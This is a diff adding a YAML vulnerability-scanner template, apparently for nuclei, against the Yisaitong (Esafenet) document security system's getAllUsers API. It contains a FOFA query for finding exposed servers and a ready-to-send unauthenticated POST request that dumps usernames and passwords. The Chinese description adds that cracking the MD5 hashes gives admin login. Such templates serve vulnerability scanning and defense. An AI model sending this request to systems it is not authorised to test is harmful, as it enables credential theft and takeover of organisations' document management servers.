@@ -1,0 +1,38 @@
+id: yisaitong-getAllUsers-Information-disclosure
+
+info:
+  name: 亿赛通电子文档安全管理系统 getAllUsers 信息泄露漏洞
+  author: unknown
+  severity: high
+  description: |-
+    fofa: body="/CDGServer3/index.jsp"
+    亿赛通电子文档安全管理系统 /CDGServer3/openapi/getAllUsers 接口处存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取后台账号密码等敏感信息，进一步MD5解密即可登录后台，使系统处于极不安全的状态。
+
+  tags: Information disclosure
+
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/openapi/getAllUsers HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        pageSize=10000&pageNumber=1
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'password'
+          - 'username'
+        condition: and
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
